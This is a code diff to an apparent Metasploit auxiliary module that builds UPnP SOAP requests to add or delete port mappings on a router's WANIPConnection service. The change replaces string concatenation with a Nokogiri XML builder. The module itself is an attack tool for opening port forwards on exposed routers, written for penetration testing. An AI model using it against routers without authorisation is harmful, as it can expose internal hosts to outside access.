@@ -5,6 +5,7 @@
 ##
 
 require 'msf/core'
+require 'nokogiri'
 
 class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -80,35 +81,39 @@ class Metasploit3 < Msf::Auxiliary
     @soap_action ||= action.opts['SOAP_ACTION']
   end
 
-  def run
-    content = "<?xml version=\"1.0\"?>"
-    content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
-    content << "<SOAP-ENV:Body>"
-    content << "<m:#{soap_action} xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
-    case action.name
-    when 'ADD'
-      content << "<NewPortMappingDescription>#{Rex::Text.rand_text_alpha(8)}</NewPortMappingDescription>"
-      content << "<NewLeaseDuration>#{lease_duration}</NewLeaseDuration>"
-      content << "<NewInternalClient>#{internal_client}</NewInternalClient>"
-      content << "<NewEnabled>1</NewEnabled>"
-      content << "<NewExternalPort>#{external_port}</NewExternalPort>"
-      content << "<NewRemoteHost>#{external_client}</NewRemoteHost>"
-      content << "<NewProtocol>#{protocol}</NewProtocol>"
-      content << "<NewInternalPort>#{internal_port}</NewInternalPort>"
-    when 'DELETE'
-      content << "<NewExternalPort>#{external_port}</NewExternalPort>"
-      content << "<NewRemoteHost>#{external_client}</NewRemoteHost>"
-      content << "<NewProtocol>#{protocol}</NewProtocol>"
+  def build_soap
+    builder = ::Nokogiri::XML::Builder.new do |xml|
+      xml['SOAP-ENV'].Envelope("xmlns:SOAP-ENV" => 'http://schemas.xmlsoap.org/soap/envelope', 'SOAP-ENV:encodingStyle' => 'http://schemas.xmlsoap.org/soap/encoding/') do
+        xml['SOAP-ENV'].Body do
+          xml['m'].send(soap_action, 'xmlns:m' => 'urn:schemas-upnp-org:service:WANIPConnection:1') do
+            case action.name
+            when 'ADD'
+              xml.NewPortMappingDescription(Rex::Text.rand_text_alpha(8)) { xml.parent.namespace = nil }
+              xml.NewLeaseDuration(lease_duration) { xml.parent.namespace = nil }
+              xml.NewInternalClient(internal_client) { xml.parent.namespace = nil }
+              xml.NewEnabled(1) { xml.parent.namespace = nil }
+              xml.NewExternalPort(external_port) { xml.parent.namespace = nil }
+              xml.NewRemoteHost(external_client) { xml.parent.namespace = nil }
+              xml.NewProtocol(protocol) { xml.parent.namespace = nil }
+              xml.NewInternalPort(internal_port) { xml.parent.namespace = nil }
+            when 'DELETE'
+              xml.NewExternalPort(external_port) { xml.parent.namespace = nil }
+              xml.NewRemoteHost(external_client) { xml.parent.namespace = nil }
+              xml.NewProtocol(protocol) { xml.parent.namespace = nil }
+            end
+          end
+        end
+      end
     end
-    content << "</m:#{soap_action}>"
-    content << "</SOAP-ENV:Body>"
-    content << "</SOAP-ENV:Envelope>"
+    builder.to_xml
+  end
 
+  def run
     res = send_request_cgi(
       'uri'           => normalize_uri(target_uri.path),
       'method'        => 'POST',
       'content-type'  => 'text/xml;charset="utf-8"',
-      'data'          => content,
+      'data'          => build_soap,
       'headers'       => {
         'SoapAction'  => "urn:schemas-upnp-org:service:WANIPConnection:1##{soap_action}"
       }
